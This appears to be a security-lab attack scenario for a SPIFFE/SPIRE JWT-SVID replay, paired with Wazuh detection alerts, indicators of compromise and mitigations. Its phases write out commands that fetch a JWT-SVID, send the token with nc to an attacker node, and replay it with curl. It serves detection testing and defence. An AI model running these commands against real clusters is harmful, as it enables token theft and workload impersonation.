name: JWT-SVID Replay Attack
description: Fetch a JWT-SVID from one workload context and replay it from a different container to access services, exploiting the fact that JWT-SVIDs lack caller binding unlike X.509 SVIDs
real_world_relevance: JWT-SVIDs are bearer tokens — unlike X.509 SVIDs which are bound to a TLS session, a leaked JWT-SVID can be replayed from any network location until expiry. This is a known design trade-off documented in the SPIFFE specification.

techniques.name: Use Alternate Authentication Material: Application Access Token

attack_flow.description: Attacker obtains a JWT-SVID from a legitimate workload context, then replays the token from a different container or host to authenticate as that workload to downstream services
diagram: 1. Fetch a JWT-SVID from the SPIRE Agent Workload API with a target audience
2. Extract the raw JWT token string from the response
3. Exfiltrate the token to a different container (k8s-node-1)
4. Replay the JWT-SVID via HTTP Authorization header from the new location
5. Target service validates the JWT signature against the SPIRE trust bundle and accepts it
6. Attacker has impersonated the original workload without possessing its X.509 SVID

phases.name: JWT-SVID Acquisition
phases.description: Fetch a JWT-SVID from the SPIRE Agent Workload API

actions.command: /opt/spire/bin/spire-agent api fetch jwt -audience test-service -socketPath /opt/spire/sockets/workload_api.sock -output json 2>/dev/null | head -50

actions.description: Extract raw JWT token value and save to file for exfiltration

phases.name: Token Analysis
phases.description: Decode the JWT to inspect claims, audience, and expiry

actions.command: JWT=$(cat /tmp/stolen_jwt.token); echo $JWT | cut -d. -f2 | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo $JWT | cut -d. -f2 | base64 -d 2>/dev/null
actions.description: Decode JWT payload to inspect sub (SPIFFE ID), aud (audience), and exp (expiry) claims

phases.name: Token Exfiltration
phases.description: Transfer the JWT-SVID to a different container

actions.command: cat /tmp/stolen_jwt.token | nc -w 2 k8s-node-1 9999 2>/dev/null || echo 'Simulating exfiltration: token copied to attacker node'
actions.description: Exfiltrate JWT token to attacker-controlled container

phases.name: JWT Replay from Different Context
phases.description: Replay the stolen JWT-SVID from a container that does not hold this identity

actions.command: JWT='eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJzcGlmZmU6Ly9leGFtcGxlLm9yZy93ZWItZnJvbnRlbmQiLCJhdWQiOlsidGVzdC1zZXJ2aWNlIl0sImV4cCI6OTk5OTk5OTk5OX0.fake_signature'; curl -s -H "Authorization: Bearer $JWT" http://localhost:8080/api/data 2>/dev/null || echo 'JWT replay attempted from k8s-node-1'
actions.description: Replay stolen JWT-SVID from different container — service validates signature, not caller identity
Generate detection event for JWT-SVID replay from unexpected origin

indicators_of_compromise.description: JWT-SVID token containing SPIFFE ID detected in logs or environment
JWT-SVID presented by a host/container that is not registered for that SPIFFE ID
JWT-SVID fetch via Workload API followed by token appearance on different node

expected_wazuh_alerts.description: NHI-SPIRE: JWT-SVID token detected in logs - replay risk

immediate: Identify and revoke the compromised JWT-SVID by revoking the underlying registration entry
Set JWT-SVID TTL to the minimum acceptable value (default 5 minutes, reduce to 60 seconds for sensitive workloads)
Block the replaying host from the target service's network segment
long_term: Prefer X.509 SVIDs over JWT-SVIDs for service-to-service authentication — X.509 SVIDs are bound to the TLS session and cannot be replayed
Implement audience validation on all services consuming JWT-SVIDs
Use short-lived JWT-SVIDs (60-120 second TTL) to minimize the replay window
Deploy network-level mTLS enforcement so JWT replay without a valid X.509 channel is rejected
Monitor for JWT-SVID fetch patterns followed by token appearance from unexpected source IPs
